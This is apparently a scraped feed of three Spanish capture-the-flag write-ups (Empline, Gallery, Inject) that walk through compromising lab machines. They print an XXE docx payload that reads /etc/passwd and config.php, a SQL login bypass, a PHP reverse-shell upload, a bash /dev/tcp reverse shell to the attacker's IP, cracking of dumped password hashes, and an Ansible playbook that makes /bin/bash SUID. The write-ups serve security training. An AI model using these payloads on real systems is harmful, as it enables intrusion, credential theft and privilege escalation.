Empline |_http-server-header: Apache/2.4.29 (Ubuntu) 3306/tcp open mysql MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1 | Thread ID: 85 | Capabilities flags: 63487 | Some Capabilities: DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, SupportsLoadDataLocal, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Support41Auth, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments | Status: Autocommit | Salt: |=Y`TT*osrc{aQR+|Rcy |_ Auth Plugin Name: mysql_native_password Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Comenzamos visitando la página web que está corriendo en el puerto 80 y visualizamos la página.\nAl irnos moviendo por los menús vemos que si hacemos hovering sobre EMPLOYMENT vemos que nos redirecciona a job.empline.thm, por lo que vamos a añadir esto al archivo /etc/hosts\n1 2 3 4 5 6 7 8 9 nvim /etc/hosts # Host addresses 127.0.0.1 localhost 127.0.1.1 parrot ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.212.220 empline.thm job.empline.thm Visitamos de nuevo la pagina y vemos que nos manda a un login.\nAqui me dío por porbar una inyección SQL por si somos capaces de bypassear el login. Al acerlo descubrimos unas cerdendiales pero ningna funciona.\nEnumeration Una vez añadido al /etc/hosts vamos a hacer fuzzing con gobuster para ver si hay alguna ruta interesante en la cual podamos hacer algo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 gobuster dir -u http://job.empline.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o web2.txt -x php,html,txt -t 50 2\u0026gt;/dev/null =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://job.empline.thm [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/02/13 18:10:29 Starting gobuster in directory enumeration mode =============================================================== /rss (Status: 301) [Size: 316] [--\u0026gt; http://job.empline.thm/rss/] /xml (Status: 301) [Size: 316] [--\u0026gt; http://job.empline.thm/xml/] /modules (Status: 301) [Size: 320] [--\u0026gt; http://job.empline.thm/modules/] /careers (Status: 301) [Size: 320] [--\u0026gt; http://job.empline.thm/careers/] /scripts (Status: 301) [Size: 320] [--\u0026gt; http://job.empline.thm/scripts/] /images (Status: 301) [Size: 319] [--\u0026gt; http://job.empline.thm/images/] /upload (Status: 301) [Size: 319] [--\u0026gt; http://job.empline.thm/upload/] /index.php (Status: 200) [Size: 3671] /ajax (Status: 301) [Size: 317] [--\u0026gt; http://job.empline.thm/ajax/] /ajax.php (Status: 200) [Size: 140] /test (Status: 301) [Size: 317] [--\u0026gt; http://job.empline.thm/test/] /lib (Status: 301) [Size: 316] [--\u0026gt; http://job.empline.thm/lib/] /src (Status: 301) [Size: 316] [--\u0026gt; http://job.empline.thm/src/] /db (Status: 301) [Size: 315] [--\u0026gt; http://job.empline.thm/db/] /js (Status: 301) [Size: 315] [--\u0026gt; http://job.empline.thm/js/] /javascript (Status: 301) [Size: 323] [--\u0026gt; http://job.empline.thm/javascript/] /temp (Status: 301) [Size: 317] [--\u0026gt; http://job.empline.thm/temp/] /vendor (Status: 301) [Size: 319] [--\u0026gt; http://job.empline.thm/vendor/] /config.php (Status: 200) [Size: 0] /attachments (Status: 301) [Size: 324] [--\u0026gt; http://job.empline.thm/attachments/] /ci (Status: 301) [Size: 315] [--\u0026gt; http://job.empline.thm/ci/] /constants.php (Status: 200) [Size: 0] /wsdl (Status: 301) [Size: 317] [--\u0026gt; http://job.empline.thm/wsdl/] /server-status (Status: 403) [Size: 280] =============================================================== 2023/02/13 18:30:51 Finished =============================================================== De aquí podemos sacar dos directorios interesantes: upload y careers.\nVisitamos careers y pinchamos en current opening positions.\nVemos que hay trabajo activo.\nAl entrar podemos aplicar para ese trabajo.\nA la hora de poder aplicar para este trabajo vemos que nos deja subir archivos(como por ejemplo un CV).Si nos fijamos en la version que se muestra de OpenCats que sale en el login y buscamos por alguna vulnerabilidad podremos encontrar el siguiente post en el cual se explica paso a paso como explotar cierta vulnerabilidad.\nhttps://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/\nEscalada El primer paso es crear un archivo .docx, en este caso lo hacemos un un script sencillo den python.\nAqui os dejo el script para que podias usarlo.\n1 2 3 4 5 from docx import Document document = Document() paragraph = document.add_paragraph(\u0026#39;Liv3P0ol\u0026#39;) document.save(\u0026#39;Liv3P0ol.docx\u0026#39;) Si en este momento decicimos subir el archivo que hemos creado vamos a ver que no devuelve como output el texto que hemos escrito, en este caso es Liv3P0ol.\nAhora como siguiente paso es descomprimir el documento .docx que tenemos ya que este no es mas que documentos .xml comprimidos. Procedemos a modificar el word/document.xml.\nDe primeras se puede introducir este comando para poder ver si funciona y ademas podemos observar el /etc/passwd.\n1 \u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt; Una vez probamos y vemos que funciona lo siguiente sera listar el contenido del archivo config.php el cual contiene usuarios y contraseñas de OpenCats.\n1 2 3 4 5 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39; standalone=\u0026#39;yes\u0026#39;?\u0026gt; \u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;php://filter/convert.base64encocode/resource=config.php\u0026#39;\u0026gt;]\u0026gt; \u0026lt;w:document xmlns:wpc=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\u0026#34; xmlns:mo=\u0026#34;http://schemas.microsoft.com/office/mac/office/2008/main\u0026#34; xmlns:mc=\u0026#34;http://schemas.openxmlformats.org/markup-compatibility/2006\u0026#34; xmlns:mv=\u0026#34;urn:schemas-microsoft-com:mac:vml\u0026#34; xmlns:o=\u0026#34;urn:schemas-microsoft-com:office:office\u0026#34; xmlns:r=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships\u0026#34; xmlns:m=\u0026#34;http://schemas.op enxmlformats.org/officeDocument/2006/math\u0026#34; xmlns:v=\u0026#34;urn:schemas-microsoft-com:vml\u0026#34; xmlns:wp14=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing\u0026#34; xmlns:wp=\u0026#34;http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\u0026#34; xmlns:w10=\u0026#34;urn:schemas-microsoft-com:office:word\u0026#34; xmlns:w=\u0026#34;http://schemas.openxmlformats.org/wordprocessingml/2006/main\u0026#34; xmlns:w14=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordm l\u0026#34; xmlns:wpg=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingGroup\u0026#34; xmlns:wpi=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingInk\u0026#34;xmlns:wne=\u0026#34;http://schemas.microsoft.com/office/word/2006/wordml\u0026#34;xmlns:wps=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingShape\u0026#34;mc:Ignorable=\u0026#34;w14 wp14\u0026#34;\u0026gt;\u0026lt;w:body\u0026gt;\u0026lt;w:p\u0026gt;\u0026lt;w:r\u0026gt;\u0026lt;w:t\u0026gt;Liv3P0ol\u0026lt;/w:t\u0026lt;/w:r\u0026gt;\u0026lt;/w:p\u0026gt;\u0026lt;w:sectPr w:rsidR=\u0026#34;00FC693F\u0026#34; w:rsidRPr=\u0026#34;0006063C\u0026#34; w:rsidSect=\u0026#34;00034616\u0026#34;\u0026gt;\u0026lt;w:pgSzw:w=\u0026#34;12240\u0026#34; w:h=\u0026#34;15840\u0026#34;/\u0026gt;\u0026lt;w:pgMar w:top=\u0026#34;1440\u0026#34; w:right=\u0026#34;1800\u0026#34; w:bottom=\u0026#34;1440\u0026#34;w:left=\u0026#34;1800\u0026#34; w:header=\u0026#34;720\u0026#34; w:footer=\u0026#34;720\u0026#34; w:gutter=\u0026#34;0\u0026#34;/\u0026gt;\u0026lt;w:cols w:space=\u0026#34;720\u0026#34;/\u0026gt;\u0026lt;w:docGridw:linePitch=\u0026#34;360\u0026#34;/\u0026gt;\u0026lt;/w:sectPr\u0026gt;\u0026lt;/w:body\u0026gt;\u0026lt;/w:document\u0026gt; Donde se encuentra el texto que tiene nuestro documento de texto hay que cambiarlo y poner \u0026amp;test.\n1 2 3 4 5 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39; standalone=\u0026#39;yes\u0026#39;?\u0026gt; \u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;php://filter/convert.base64encocode/resource=config.php\u0026#39;\u0026gt;]\u0026gt; \u0026lt;w:document xmlns:wpc=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\u0026#34; xmlns:mo=\u0026#34;http://schemas.microsoft.com/office/mac/office/2008/main\u0026#34; xmlns:mc=\u0026#34;http://schemas.openxmlformats.org/markup-compatibility/2006\u0026#34; xmlns:mv=\u0026#34;urn:schemas-microsoft-com:mac:vml\u0026#34; xmlns:o=\u0026#34;urn:schemas-microsoft-com:office:office\u0026#34; xmlns:r=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships\u0026#34; xmlns:m=\u0026#34;http://schemas.op enxmlformats.org/officeDocument/2006/math\u0026#34; xmlns:v=\u0026#34;urn:schemas-microsoft-com:vml\u0026#34; xmlns:wp14=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing\u0026#34; xmlns:wp=\u0026#34;http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\u0026#34; xmlns:w10=\u0026#34;urn:schemas-microsoft-com:office:word\u0026#34; xmlns:w=\u0026#34;http://schemas.openxmlformats.org/wordprocessingml/2006/main\u0026#34; xmlns:w14=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordm l\u0026#34; xmlns:wpg=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingGroup\u0026#34; xmlns:wpi=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingInk\u0026#34;xmlns:wne=\u0026#34;http://schemas.microsoft.com/office/word/2006/wordml\u0026#34;xmlns:wps=\u0026#34;http://schemas.microsoft.com/office/word/2010/wordprocessingShape\u0026#34;mc:Ignorable=\u0026#34;w14 wp14\u0026#34;\u0026gt;\u0026lt;w:body\u0026gt;\u0026lt;w:p\u0026gt;\u0026lt;w:r\u0026gt;\u0026lt;w:t\u0026gt;\u0026amp;test;\u0026lt;/w:t\u0026lt;/w:r\u0026gt;\u0026lt;/w:p\u0026gt;\u0026lt;w:sectPr w:rsidR=\u0026#34;00FC693F\u0026#34; w:rsidRPr=\u0026#34;0006063C\u0026#34; w:rsidSect=\u0026#34;00034616\u0026#34;\u0026gt;\u0026lt;w:pgSzw:w=\u0026#34;12240\u0026#34; w:h=\u0026#34;15840\u0026#34;/\u0026gt;\u0026lt;w:pgMar w:top=\u0026#34;1440\u0026#34; w:right=\u0026#34;1800\u0026#34; w:bottom=\u0026#34;1440\u0026#34;w:left=\u0026#34;1800\u0026#34; w:header=\u0026#34;720\u0026#34; w:footer=\u0026#34;720\u0026#34; w:gutter=\u0026#34;0\u0026#34;/\u0026gt;\u0026lt;w:cols w:space=\u0026#34;720\u0026#34;/\u0026gt;\u0026lt;w:docGridw:linePitch=\u0026#34;360\u0026#34;/\u0026gt;\u0026lt;/w:sectPr\u0026gt;\u0026lt;/w:body\u0026gt;\u0026lt;/w:document\u0026gt; Volvemos a meter el archivo que hemos modificado en el documento .docx que teniamos.\nAl subirlo vemos que nos devuelve lo que esperabamos pero en base64, por lo que vamos a tener que revertirlo y ver la información en texto plano.\nUsamos Cyberchef, y vemos datos los cuales podemos usar para poder conectarnos a mysql teniendo el usuario, password y la IP de la máquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 mysql -u james -h 10.10.212.220 -p MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | opencats | +--------------------+ MariaDB [(none)]\u0026gt; use opencats; MariaDB [opencats]\u0026gt; show tables; MariaDB [opencats]\u0026gt; describe user; MariaDB [opencats]\u0026gt; select user_name,password from user; +----------------+----------------------------------+ | user_name | password | +----------------+----------------------------------+ | admin | b67b5ecc5d8902ba59c65596e4c053ec | | cats@rootadmin | cantlogin | | george | 86d0dfda99dbebc424eb4407947356ac | | james | e53fbdb31890ff3bc129db0e27c473c9 | +----------------+----------------------------------+ Sacamos los hashes de contraseñas y porcedemos a crackerlos.Con esto sacamos la contraseña de George. Con esta nos conectaremos a través de ssh y procedemos a sacar la flag de usuario.\n1 2 3 4 5 ssh george@10.10.212.220 george@empline:~$ ls user.txt george@empline:~$ cat user.txt 91cb89c70aa2e5ce0e0116dab099078e Enumerando el sistema vemos que en la capabilities podemos cambiar el propietario de un archivo con ruby.\nProcedemos a crear un script en ruby el cual lea y coja el output del archivo /etc/passwd y despues creemos uno en el cual le demos permisos a George que es el usuario con el uid y gid 1002.\nAhora generaremos una contraseña la cual la vamos a sustituir por la que tiene el usuario Root actualmente.\nY procedemos a cambiar de usuario a Root y obtener la flag.\n","date":"2023-08-23T00:00:00Z","image":"/p/writeup-empline/logo_hua65c6c6a95811e4ada5ccd44d600f53a_44605_120x120_fill_box_smart1_3.png","permalink":"/p/writeup-empline/","title":"WriteUp Empline"},{"content":"Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.\nParámetro → Descripción\n-p- → Escanea el rango completo de puertos(65535 puertos). \u0026ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. \u0026ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts. -oG → Guardar el output en formato grepeable. 1 2 3 4 5 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.170.103 -oG allports PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 63 Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos.\nParámetro → Descripción\n-sC → Muestra todos los scripts relacionados con el servicio. -sV → Determina la version del servicio. -p → Escanea sobre los peurtos especificados. -oN → Guarda el output en un arcivo con formato normal. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 nmap -sCV -p80,8080 10.10.170.103 -oN targeted PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-open-proxy: Proxy might be redirecting requests |_http-title: Simple Image Gallery System |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Enumeration Como podemos ver en el escaneo de nmap hay dos puertos abiertos, los cuales ambos son servicios webs.Si visitamos el primer servicio web veremos que se nos muestra la pagina por defecto de Apache2. Sin embargo, si visitamos el segundo servicio corriendo en el puerto 8080, vemos que nos redirije a una pagina de autenticación.\nProbamos a meter unas credenciales y capturar la respuesta del servidor con BurpSuite . Si vemos el error nos damos cuenta que parece ser de SQL, lo cual nos puede hacer sospechar que es vulnerable a SQLi.\nProbamos a hacer un bypass del login con una inyeccion SQL básica para ver si funciona. → admin' or 1=1-- -\nVemos que ha funcionado y hemos accecido como Administrador.\nExplotacion Si nos vamos moviendo por los menús de la página vemos que en el sitio de Albums hay una opción de uploads. Probamos a subir una reversell de php, en cual hay que cambiar algunos valores como la IP y el PUERTO al cual queremos que nos envie la reverse shell.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nNos ponemos en escucha con nc en el PUERTO e IP que hemos puesto en el archivo php que hemos subido a la web y obtendremos una shell.\nEscalada Recibimos la shell, pero esta shell es muy inestable por lo que vamos a hacer un tratamiento de la TTY para no tener futuros problemas con la shell.\n1 2 3 4 5 6 7 8 9 10 11 nc -lvnp 4443 listening on [any] 4443 ... connect to [10.9.41.113] from (UNKNOWN) [10.10.170.103] 35558 Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 18:09:49 up 27 min, 0 users, load average: 0.00, 0.90, 3.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can`t access tty; job control turned off $ whoami www-data Tratamiento de la TTY\n1 2 3 4 5 6 script /dev/null -c bash ^Z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Una vez con el tratemiento de la TTY hecho y la shell mas estable es hora de escalar privlegios a un usuario del sistema, y despues alcanzar a ser root.\nPara obtener la contraseña que se nos pide en uno de los apartados de TryHackMe es necesario buscar la contraseña del admin, en mi caso lo he hecho yendo al archivo initialize.php en el cual hay credenciales para iniciar sesion en la base de datos y así poder extraer dicha contraseña hasheada y crackearla posteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 cd /var/www/html/gallery www-data@gallery:/var/www/html/gallery$ cat initialize.php \u0026lt;?php $dev_data = array(\u0026#39;id\u0026#39;=\u0026gt;\u0026#39;-1\u0026#39;,\u0026#39;firstname\u0026#39;=\u0026gt;\u0026#39;Developer\u0026#39;,\u0026#39;lastname\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;username\u0026#39;=\u0026gt;\u0026#39;dev_oretnom\u0026#39;,\u0026#39;password\u0026#39;=\u0026gt;\u0026#39;5da283a2d990e8d8512cf967df5bc0d0\u0026#39;,\u0026#39;last_login\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;date_updated\u0026#39;=\u0026gt;\u0026#39;\u0026#39;,\u0026#39;date_added\u0026#39;=\u0026gt;\u0026#39;\u0026#39;); if(!defined(\u0026#39;base_url\u0026#39;)) define(\u0026#39;base_url\u0026#39;,\u0026#34;http://\u0026#34; . $_SERVER[\u0026#39;SERVER_ADDR\u0026#39;] . \u0026#34;/gallery/\u0026#34;); if(!defined(\u0026#39;base_app\u0026#39;)) define(\u0026#39;base_app\u0026#39;, str_replace(\u0026#39;\\\\\u0026#39;,\u0026#39;/\u0026#39;,__DIR__).\u0026#39;/\u0026#39; ); if(!defined(\u0026#39;dev_data\u0026#39;)) define(\u0026#39;dev_data\u0026#39;,$dev_data); if(!defined(\u0026#39;DB_SERVER\u0026#39;)) define(\u0026#39;DB_SERVER\u0026#39;,\u0026#34;localhost\u0026#34;); if(!defined(\u0026#39;DB_USERNAME\u0026#39;)) define(\u0026#39;DB_USERNAME\u0026#39;,\u0026#34;gallery_user\u0026#34;); if(!defined(\u0026#39;DB_PASSWORD\u0026#39;)) define(\u0026#39;DB_PASSWORD\u0026#39;,\u0026#34;passw0rd321\u0026#34;); if(!defined(\u0026#39;DB_NAME\u0026#39;)) define(\u0026#39;DB_NAME\u0026#39;,\u0026#34;gallery_db\u0026#34;); ?\u0026gt; www-data@gallery:/var/www/html/gallery$ mysql -h localhost -u gallery_user -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 251 Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | gallery_db | | information_schema | +--------------------+ 2 rows in set (0.00 sec) MariaDB [(none)]\u0026gt; use gallery_db; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [gallery_db]\u0026gt; show tables; +----------------------+ | Tables_in_gallery_db | +----------------------+ | album_list | | images | | system_info | | users | +----------------------+ 4 rows in set (0.00 sec) MariaDB [gallery_db]\u0026gt; describe users; +---------------------------+--------------+------+-----+-------------------+-----------------------------+ | Field | Type | Null | Key | Default | Extra | +---------------------------+--------------+------+-----+-------------------+-----------------------------+ | id | int(50) | NO | PRI | NULL | auto_increment | | firstname | varchar(250) | NO | | NULL | | | lastname | varchar(250) | NO | | NULL | | | username | text | NO | | NULL | | | password | text | NO | | NULL | | | avatar | text | YES | | NULL | | | last_login | datetime | YES | | NULL | | | type | tinyint(1) | NO | | 0 | | | date_added | datetime | NO | | CURRENT_TIMESTAMP | | | date_updated | datetime | YES | | NULL | on update CURRENT_TIMESTAMP | +---------------------------+--------------+------+-----+-------------------+-----------------------------+ 10 rows in set (0.01 sec) MariaDB [gallery_db]\u0026gt; Select username,password from users where username=\u0026#39;admin\u0026#39;; +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | admin | a228b12a08b6527e7978cbe5d914531c | +----------+----------------------------------+ 1 row in set (0.01 sec) john --format=raw-MD5 /usr/share/wordlists/rockyou.txt pass.hash 2\u0026gt;/dev/null Loaded 53 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) emerald (?) Investigando por el sistema me encontré en la directorio de backups uno que era muy sospechoso. Nos metemos dentro y al ver que contiene vemos que tenemos capacidad de lectura en todos los archivos, por lo que hay uno que podría ser muy curioso ver que hay dentro de él. → .bash_history\nY vemos que hay una contraseña la cuál si la usamos para convertirnos en mike funciona.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 www-data@gallery:/home/mike$ cd /var/backups/ www-data@gallery:/var/backups$ ls apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz apt.extended_states.3.gz mike_home_backup www-data@gallery:/var/backups$ cd mike_home_backup/ www-data@gallery:/var/backups/mike_home_backup$ ls -la total 36 drwxr-xr-x 5 root root 4096 May 24 2021 . drwxr-xr-x 3 root root 4096 Jan 30 17:44 .. -rwxr-xr-x 1 root root 135 May 24 2021 .bash_history -rwxr-xr-x 1 root root 220 May 24 2021 .bash_logout -rwxr-xr-x 1 root root 3772 May 24 2021 .bashrc drwxr-xr-x 3 root root 4096 May 24 2021 .gnupg -rwxr-xr-x 1 root root 807 May 24 2021 .profile drwxr-xr-x 2 root root 4096 May 24 2021 documents drwxr-xr-x 2 root root 4096 May 24 2021 images www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history cd ~ ls ping 1.1.1.1 cat /home/mike/user.txt cd /var/www/ ls cd html ls -al cat index.html sudo -lb3stpassw0rdbr0xx -\u0026gt; Esta es la contraseña de mike quitando el -l clear sudo -l exit www-data@gallery:/var/backups/mike_home_backup$ su mike Password: mike@gallery:~$ cat user.txt THM{af05cd30bfed67849bexxxxxxx} Una vez como mike, probamos a ver que podemos ejecutar como root con → sudo -l, y vemos que podemos ejcutar un script de bash como usuario root sin necesidad de contraseña.\n1 2 3 4 5 6 mike@gallery:~$ sudo -l Matching Defaults entries for mike on gallery: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mike may run the following commands on gallery: (root) NOPASSWD: /bin/bash /opt/rootkit.sh Antes de ejecutarlo vamos a inspeccionar su contenido. Vemos que podemos usar nano como root, lo cual ya es probable que podamos escalar privilegios gracias a nano.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 mike@gallery:/opt$ cat rootkit.sh #!/bin/bash read -e -p \u0026#34;Would you like to versioncheck, update, list or read the report ? \u0026#34; ans; Execute your choice case $ans in versioncheck) /usr/bin/rkhunter --versioncheck ;; update) /usr/bin/rkhunter --update;; list) /usr/bin/rkhunter --list;; read) /bin/nano /root/report.txt;; *) exit;; esac Nos vamos a GTFObins, el cual nos ayudará a saber como escalar privilegios con nano → https://gtfobins.github.io/\nEjecutamos el script y veremos que se nos abre nano.Una vez dentro solamente tendremos que hacer lo que nos dice GTFObins.\n1 2 mike@gallery:/opt$ sudo /bin/bash /opt/rootkit.sh Would you like to versioncheck, update, list or read the report ? read Y una vez siendo root ya podemos visualizar la flag de ROOT.\n","date":"2023-08-23T00:00:00Z","image":"/p/writeup-gallery/logo_hua0b92525cbc2653ca50d40ec787593a2_15704_120x120_fill_box_smart1_3.png","permalink":"/p/writeup-gallery/","title":"WriteUp Gallery"},{"content":"Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.\nParámetro → Descripción\n-p- → Escanea el rango completo de puertos(65535 puertos). \u0026ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. \u0026ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts. -oG → Guardar el output en formato grepeable. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG allports PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 63 nmap -sCV -p22,8080 10.10.11.204 -oN targeted PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-open-proxy: Proxy might be redirecting requests |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration Procedemos a visitar la web que está corriendo bajo el puerto 8080.\nSi nos fijamos bien arriba a la derecha sale un apartado donde parece que podemos subir archivos.\nSolo permite subir imágenes, por lo que subimos una.\nUna vez subida vemos que la url apunta a la imagen que hemos subido.\nPor lo que podemos probar a explotar un Directory Path Traversal a ver si somos capaces de listar el contenido de algunos archivos de la máquina.\nPero vemos que nos suelta un error por pantalla. Probamos a hacer lo mismo desde Burpsuite y vemos que si nos fuinciona y podemos listar el contenido del /etc/passwd.\nInvestigando por el sistema encontramos que el usuario Frank tiene un archivo .xml en el cual hay unas credenciales. Probamos estas credenciales en el servicio ssh pero no podemos acceder.\nSi buscamos en el directorio en el que se guardan los archivos de la web vemos que hay dos directorios. El 1º html no podemos leer nada o está vacío, pero en el 2º WebApp vemos que hay un archivo un tanto interesante, el pom.xml el cuál es un archivo de configuración que se usa en los proyectos de java el cual maneja depencias.\nSi buscamos sobre posibles vulnerabilidades correspondientes con las versiones que salen en el archivo encontramos el siguiente CVE -\u0026gt; https://www.cvedetails.com/cve/CVE-2022-22963/\nEscalada Si buscamos por el CVE en metasploit vemos que hay un módulo para explotarlo.\nModificamos los parámetros correspondientes para que el módulo fucione.\nY al ejecutarlo vemos que recibimos una shell como Frank.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (Meterpreter 1)(/) \u0026gt; shell su phil Password: DocPhillovestoInject123 id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) ls frank phil cd phil ls user.txt cat user.txt 88dfe79b98bd67fd08554d758cxxxxxx bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/4443 0\u0026gt;\u0026amp;1 Con la contraseña que encontramos antes del usuario Phil la probamos para cambiar a ese usuario y funciona. Procedemos a ver la flag de user y después en mi caso me mandé una revershell en bash para poder moverme con mayor facilidad.\nAqui subí el ejectable de pspy, y encontramos que el usuario root esta ejecutando ansible-paraller en todos los archivos acabados con extensión .yml que hay en el directorio /opt/automation/tasks.\n1 2023/03/21 18:52:02 CMD: UID=0 PID=2702 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml Vemos el contenido del script de ansible-parallel y buscando sobre esto encontramos el siguiente artíuclo el cual explica como funciona esto -\u0026gt; https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/\n1 2 3 4 5 6 7 8 9 phil@inject:/tmp$ cat /usr/local/bin/ansible-parallel #!/usr/bin/python3 # -*- coding: utf-8 -*- import re import sys from ansible_parallel import main if __name__ == \u0026#39;__main__\u0026#39;: sys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0]) sys.exit(main()) Por lo que procedemos a crear nuestro propio archivo .yml el cual le de permisos SUID a la bash, para asi poder acceder a ella con permisos privilegiados.\n1 2 3 4 5 6 7 8 phil@inject:/opt/automation/tasks$ cat pwnd.yml - name: live hosts: localhost connection: local tasks: - name: live shell: \u0026#34;chmod u+s /bin/bash\u0026#34; register: \u0026#34;output\u0026#34; Una vez el binario de bash tenga ciertos permisos podremos obtener una shell como root con el comando bash 